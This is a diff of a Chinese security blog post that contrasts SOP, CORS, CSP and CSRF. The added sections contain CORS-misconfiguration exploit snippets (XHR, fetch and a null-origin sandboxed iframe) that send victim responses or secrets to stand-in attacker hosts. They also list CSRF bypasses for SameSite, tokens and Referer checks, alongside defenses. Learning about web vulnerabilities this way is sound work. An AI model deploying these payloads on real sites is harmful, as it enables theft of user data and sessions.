@@ -21,19 +21,22 @@
   
     <meta name="description" content="这里记录一下一直混淆的几个点，CORS，SOP，CSP SOP（同源策略）​	同源策略用于防止不同源的网页相互访问敏感数据（读取另一个网站的 cookie、localStorage、DOM或防止跨站点脚本直接操作另一个站点的页面。）  同源：协议，域名，端口全部相同 123https:&#x2F;&#x2F;a.example.com:443 与 https:&#x2F;&#x2F;a.example.com:443  ✅ 同源  ht">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CSRF">
+<meta property="og:title" content="SOP,CORS,CSRF混淆区分">
 <meta property="og:url" content="https://i4g5d.github.io/2025/10/30/CSRF/index.html">
 <meta property="og:site_name" content="i4G5d-Blog">
 <meta property="og:description" content="这里记录一下一直混淆的几个点，CORS，SOP，CSP SOP（同源策略）​	同源策略用于防止不同源的网页相互访问敏感数据（读取另一个网站的 cookie、localStorage、DOM或防止跨站点脚本直接操作另一个站点的页面。）  同源：协议，域名，端口全部相同 123https:&#x2F;&#x2F;a.example.com:443 与 https:&#x2F;&#x2F;a.example.com:443  ✅ 同源  ht">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/30/CSRF/image-20251030203425958.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/10/30/CSRF/image-20251030195714203.png">
 <meta property="article:published_time" content="2025-10-30T06:13:14.000Z">
-<meta property="article:modified_time" content="2025-10-30T07:01:43.019Z">
+<meta property="article:modified_time" content="2025-10-30T12:36:42.496Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i4g5d.github.io/2025/10/30/CSRF/image-20251030203425958.png">
   
   
   
-  <title>CSRF - i4G5d-Blog</title>
+  <title>SOP,CORS,CSRF混淆区分 - i4G5d-Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CSRF"></span>
+            <span id="subtitle" data-typed-text="SOP,CORS,CSRF混淆区分"></span>
           
         </div>
 
@@ -222,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          5.6k 字
         
       </span>
     
@@ -233,7 +236,7 @@
         
         
         
-          11 分钟
+          47 分钟
         
       </span>
     
@@ -270,7 +273,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CSRF</h1>
+            <h1 id="seo-header">SOP,CORS,CSRF混淆区分</h1>
             
             
               <div class="markdown-body">
@@ -291,47 +294,189 @@
 <p>​	它允许服务器声明哪些源可以访问自己的资源，从而在受控的情况下<strong>突破 SOP 限制</strong>。</p>
 <p>​	浏览器发起跨域请求，会根据请求类型分为</p>
 <ul>
-<li><strong>简单请求（simple request）</strong>：直接发送请求；</li>
+<li><strong>简单请求（simple request）</strong>：直接发送请求；（GET、HEAD、POST，不能自定义标头，）</li>
 <li><strong>复杂请求（non-simple request）</strong>：会先发送一个 <strong>预检请求（OPTIONS）</strong>。</li>
 </ul>
 <p>​	服务器通过请求头告知服务器是否允许跨域请求</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://example.com<br><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>GET, POST<br><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true<br></code></pre></td></tr></table></figure>
-<p>​	</p>
 <details>
 <summary>**展开查看具体过程**</summary>
 
 
 
 <ol>
-<li>JS 发起一个跨域请求（比如 a.com 请求 b.com）。</li>
-<li>浏览器发现这是跨域的，根据 SOP 本该禁止读取响应。</li>
-<li>但是浏览器会先看看 b.com 的响应头中有没有：</li>
-</ol>
-<p>Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="https://a.com/">https://a.com</a></p>
-<ol start="4">
+<li><p>JS 发起一个跨域请求（比如 a.com 请求 b.com）。</p>
+</li>
+<li><p>浏览器发现这是跨域的，根据 SOP 本该禁止读取响应。</p>
+</li>
+<li><p>但是浏览器会先看看 b.com 的响应头中有没有：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://a.com<br></code></pre></td></tr></table></figure>
+</li>
 <li><p>如果有，说明服务器明确允许 a.com 访问自己的资源。</p>
 </li>
 <li><p>浏览器就放行，让 JS 能读到响应内容。</p>
+<p>这里解释一下，简单请求是直接发出请求，复杂请求要先发一个OPtion，响应中的请求头允许跨域才会真正发送请求</p>
+<p>所以执行CSRF尽量使用简单请求</p>
 </li>
 </ol>
+</details>
 
+<h3 id="CORS安全漏洞"><a href="#CORS安全漏洞" class="headerlink" title="CORS安全漏洞"></a>CORS安全漏洞</h3><ol>
+<li><p>一些应用程序为了方便，允许从任何其他域进行访问。</p>
+<p>一种方法是读取请求中的 Origin 标头，并在响应标头中添加声明允许该请求来源的字段。例如，假设一个应用程序收到以下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">GET /sensitive-victim-data HTTP/1.1 <br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com <br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>test.com <br>Cookie:<br></code></pre></td></tr></table></figure>
 
+<p>然后它回应道：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK <br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>test.com <br><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true<br></code></pre></td></tr></table></figure>
 
+<p>这种情况下很危险,随意就能绕过SOP,获得回显,</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-property">onload</span> = reqListener;<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://要窃取的网站/sensitive-victim-data&#x27;</span>,<span class="hljs-literal">true</span>);<br>req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;<br>req.<span class="hljs-title function_">send</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) &#123;<br>	location=<span class="hljs-string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
 
+<ol start="2">
+<li>Origin白名单问题设置</li>
+</ol>
+<p>一些支持多源访问的网站通过白名单比较,这其中可能产生的情况就是</p>
+<ul>
+<li><p>简单前后缀匹配绕过</p>
+</li>
+<li><p>Null值</p>
+<p>开发者为了调试,想允许 <code>file://</code>、<code>data:</code> 或本地页面发起跨域请求，因此把 <code>Access-Control-Allow-Origin: null</code> 或允许 <code>Origin: null</code> 当成“允许本地或开发来源”的快捷方式。</p>
+<p>可以利用<code>iframe</code>形式的沙盒跨域请求绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> src=<span class="hljs-string">&quot;data:text/html,&lt;script&gt;</span><br><span class="hljs-string">var req = new XMLHttpRequest();</span><br><span class="hljs-string">req.onload = reqListener;</span><br><span class="hljs-string">req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true);</span><br><span class="hljs-string">req.withCredentials = true;</span><br><span class="hljs-string">req.send();</span><br><span class="hljs-string"></span><br><span class="hljs-string">function reqListener() &#123;</span><br><span class="hljs-string">location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
+
+<p>使用 <code>iframe</code>的<code>sandbox</code> 属性可以产生空源请求。从 <code>iframe</code> 进行请求，需要使用绝对路径将日志写入攻击者服务器</p>
+</li>
+</ul>
+<ol start="3">
+<li>即使配置已经严格,但假设信任的源存在XSS,利用 XSS 仍能通过跨源资源请求窃取敏感数据</li>
+</ol>
+<p>例如<code>a.com</code>只信任<code>b.com</code>,a允许b获取信息,但<code>b.com</code>存在XSS.</p>
+<p>那么攻击者就可以利用 XSS 在当前发起对 a 网站的跨源资源请求</p>
+<p>把xss的alert换成下面的<code>payload</code>(fetch写法),就能往攻击者服务器发送cookie</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://a/api/requestApiKey&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>  <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>   <span class="hljs-comment">// 关键：让浏览器带上 cookie / 会话凭证</span><br>&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">secret</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 把秘密发回攻击者服务器（exfiltrate）</span><br>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://attacker.example.com/log?d=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(secret);<br>&#125;);<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>所以如果受害者点击(xHR写法)(如果b可以被很多源访问,就达成了借B杀A)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;https://b/?xss=&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://a/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://攻击者服务器/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&quot;</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>防御</li>
+</ol>
+<p>所以防止也很简单,就是严格的限制白名单,避免NULL</p>
+</li>
+</ol>
 <h2 id="CSP（内容安全策略）"><a href="#CSP（内容安全策略）" class="headerlink" title="CSP（内容安全策略）"></a>CSP（内容安全策略）</h2><p>​	**CSP 是浏览器提供的防御机制，用于防止 XSS和数据注入攻击。**它通过限制页面能加载哪些资源、执行哪些脚本，来减少攻击面。</p>
 <p>​	CSP通过响应头声明</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com<br></code></pre></td></tr></table></figure>
 
 <p>​	这表示：</p>
 <ul>
-<li><p>所有资源默认只能从本源加载；</p>
+<li>所有资源默认只能从本源加载；</li>
+<li>JS 脚本只能来自本站点或指定的 CDN；</li>
+<li>禁止行内 <code>&lt;script&gt;</code> 执行（除非加 <code>&#39;unsafe-inline&#39;</code>）。</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><img src="/2025/10/30/CSRF/image-20251030203425958.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	CSRF的原理很简单,简单来说是就<strong>攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作</strong>（如发邮件，发消息，甚至财产操作（如转账和购买商品））</p>
+<p>​	这里现先区分一个概念,站和源</p>
+<p><img src="/2025/10/30/CSRF/image-20251030195714203.png" srcset="/img/loading.gif" lazyload></p>
+<p>SameSite 的工作原理是**使浏览器和网站所有者能够限制哪些跨站点请求（如果有）应包含特定 Cookie。**这有助于减少用户遭受 CSRF 攻击的风险，CSRF 攻击会诱使受害者的浏览器发出请求，从而在易受攻击的网站上触发有害操作。由于这些请求通常需要与受害者的身份验证会话关联的 cookie，因此如果浏览器不包含此 cookie，则攻击将失败。</p>
+<p>所有主流浏览器当前都支持以下 SameSite 限制级别：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#strict"><code>Strict</code> <code>严格</code></a> </p>
+<p>​    浏览器不会在任何跨站点请求中发送该 Cookie。简单来说，这意味着，如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，则它将不包含 Cookie。</p>
 </li>
-<li><p>JS 脚本只能来自本站点或指定的 CDN；</p>
+<li><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax"><code>Lax</code> <code>宽松</code></a></p>
+<pre><code class="hljs"> 意味着浏览器将在跨站点请求中发送 Cookie，但前提是同时满足以下两个条件：
+</code></pre>
+<ul>
+<li>该请求使用 <code>GET</code> 方法。</li>
+<li>该请求是用户进行顶级导航（例如单击链接）的结果。</li>
+</ul>
 </li>
-<li><p>禁止行内 <code>&lt;script&gt;</code> 执行（除非加 <code>&#39;unsafe-inline&#39;</code>）。</p>
+<li><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none"><code>None</code> <code>没有</code></a> </p>
+<p>​    无论浏览器如何，这都会有效地完全禁用 SameSite 限制。因此，浏览器将在向发出此 Cookie 的站点发送此 Cookie 的所有请求中，即使是由完全不相关的第三方网站触发的请求。</p>
 </li>
 </ul>
-</details>
+<p>​	所以现代网站通常是这样防御的：</p>
+<table>
+<thead>
+<tr>
+<th>机制</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>SOP</strong></td>
+<td>阻止跨域响应被读取（防止数据泄露）</td>
+</tr>
+<tr>
+<td><strong>CSRF Token</strong></td>
+<td>验证请求是否来自合法源（防止请求伪造）</td>
+</tr>
+<tr>
+<td><strong>SameSite Cookie</strong></td>
+<td>阻止跨站请求自动带上 cookie</td>
+</tr>
+<tr>
+<td><strong>CORS</strong></td>
+<td>只允许可信源读取响应数据</td>
+</tr>
+</tbody></table>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击:"></a>攻击:</h3><p>​	要进行CSRF攻击不过是构造简单的POC并尽量进行验证绕过</p>
+<ul>
+<li><p>换请求方式绕过验证</p>
+</li>
+<li><p>验证方式缺陷</p>
+<ul>
+<li>只验证有没有CSRF令牌</li>
+<li>未绑定用户的令牌(随便用一个真实令牌)</li>
+<li>CSRF令牌与非会话cookie相关联(注入一对csrf cookie和csrf token)</li>
+<li>只验证双重CSRF是否相同(上一条两者一样的情况)</li>
+</ul>
+</li>
+<li><p>SameSite有可能的漏洞</p>
+<ul>
+<li><p>对于LAX, 用 document.location函数来顶级导航 and 覆盖请求行中的method(Symfony)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;_method&quot;</span> value=<span class="hljs-string">&quot;GET&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>对于Strict, 利用重定向</p>
+<p>第一次攻击者网站诱骗受害者访问bank.com&#x2F;?payload,这时不会带cookie</p>
+<p>如果构造的bank.com的url通过业内函数能向同站再发一次,就会绕过Strict</p>
+</li>
+<li><p>利用同站和同源的区别绕过STrict</p>
+</li>
+</ul>
+</li>
+<li><p>有些网站用Referer做防御</p>
+<ul>
+<li><p>使Referer消失(META 标签)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;never&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Referer的简单验证</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">http://vulnerable-website.com.attacker-website.com/csrf-attack<br>http://attacker-website.com/csrf-attack?vulnerable-website.com<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="预防："><a href="#预防：" class="headerlink" title="预防："></a>预防：</h3><ol>
+<li>使用Token验证</li>
+<li>验证Referer头部</li>
+<li>SameSite Cookie属性<br>设置Cookie的SameSite属性为<code>Lax</code>或<code>Strict</code>，可以有效防止跨站请求携带Cookie。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在Flask中设置SameSite属性 </span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, make_response <br><br>app = Flask(__name__) <br><span class="hljs-meta">@app.after_request </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_security_headers</span>(<span class="hljs-params">response</span>): <br>	response.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, value=<span class="hljs-string">&#x27;cookie_value&#x27;</span>, secure=<span class="hljs-literal">True</span>, httponly=<span class="hljs-literal">True</span>, samesite=<span class="hljs-string">&#x27;Lax&#x27;</span>) <br>		<span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>双Token机制</p>
+<p>除了上述提到的单一Token验证外，还可以采用双Token机制。一个Token作为会话管理，存储在Cookie中；另一个Token作为请求验证，存储在本地存储（如localStorage）。每次请求时，除了表单中的Token，还需通过Ajax传递另一个Token，以此增加攻击难度。</p>
+</li>
+<li><p>时间戳与Nonce</p>
+<p>在Token的基础上，增加时间戳和Nonce（一次性随机数），可以有效防止重放攻击。服务器验证请求时，不仅检查Token的有效性，还要确认时间戳在合理范围内且Nonce未被使用过。</p>
+</li>
+<li><p>CSP</p>
+<p>通过设置严格的Content Security Policy，限制页面加载资源的能力，可以降低跨站脚本注入的风险，间接减少CSRF攻击的机会。</p>
+</li>
+<li><p>CSRF 令牌<br>CSRF 令牌是由服务器端应用程序生成并与客户端共享的唯一、秘密且不可预测的值。当尝试执行敏感操作（例如提交表单）时，客户端必须在请求中包含正确的 CSRF 令牌。这使得攻击者很难代表受害者构建有效的请求。</p>
+</li>
+</ol>
+
                 
               </div>
             
@@ -369,7 +514,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CSRF</div>
+      <div>SOP,CORS,CSRF混淆区分</div>
       <div>https://i4g5d.github.io/2025/10/30/CSRF/</div>
     </div>
     <div class="license-meta">
